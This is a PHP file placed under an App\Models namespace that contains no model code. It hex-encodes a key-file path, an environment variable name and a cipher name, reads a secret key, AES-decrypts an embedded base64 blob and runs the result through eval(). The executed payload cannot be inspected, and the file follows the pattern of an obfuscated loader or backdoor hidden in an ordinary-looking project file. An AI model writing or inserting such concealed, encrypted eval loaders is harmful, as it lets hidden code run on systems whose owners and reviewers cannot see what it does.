<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('A04GgPrOO+oSJF7H2rze3A==');

$c=base64_decode(

'megwphonQzZV40gQDn1ildHFDOmX8NFBJXWc8H8YJv1ODsHQcBZbBTw0nR2qoj1jYtPwJwOf9Ebl' .
'M40E5GMerbiA6mc9pSYdfS3qKf/OTScxQiqJsKP9tzf+4Fq/85iRyhKZXA9niIa+xAL6bE/BX00C' .
'Q5mHcg8uzYtQbliTYthzNGD06CpNK3JRZ9rL+ZK/SA/WJcZr7jiRnTvOZ0OvIUYSE1v5qLgEOIA/' .
'gwEU+QYiNXQEuMsUqKWhBNIFg9V3t+YFP6Z8cwJ0bZsyRyY3M7b+59Op6QkDnq3GwVlqzGLofyKI' .
'lU02kztNHUwA+/9LPuI+1mjP/MsRYpBOSSkI6S7umklKTOJX8yONmo6bXWYy6yM67rqbUpWrtzNR' .
'undM+VG0MT1UFK7NAYRLo//F4B32fvj7yWeffgeDtJuN84GVuBkbi/OrMAD0au1ppvZcwT99xs7F' .
'JhakzlwDQWKTDcF/TDS4uYXTsoXHD8J08Sxs4mrbvHClj2/60qR/uZEKqvINlSxXLhhAc6GSB14o' .
'0yaXbHe0mtn17dDFhd0vEObeXRWvC1hpO5amD+3L7rBzXMRA1gPFHa2UbSs5wH3CcTepxqDYkwcE' .
'nFBWrYURRozC6bPDaqLD6cgsKKSIbCnbuZHFvpcV2d709//p/wEOb77l67gK+ip0R+d/fWb0kt/8' .
'8yeU6aVrcc2aM2Hb/wEV6/51yCK6HWj4ykoX5/LNCyxi7/ORWTkvHBZwTBgrjcpTSKPm4ZlIA4TP' .
'nz5At6DOQmKcvbRMvX1WVMziJJpVhk+zoI/nu6MahvDiA1MveUcJ3164oskOkkJjCMoj77oPbNqT' .
'HkcKJpc9TdSvvnH4KWPwxd+VpPMfDyLztXEfoDR480ml/kbHcDo9Rc6uflvA'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

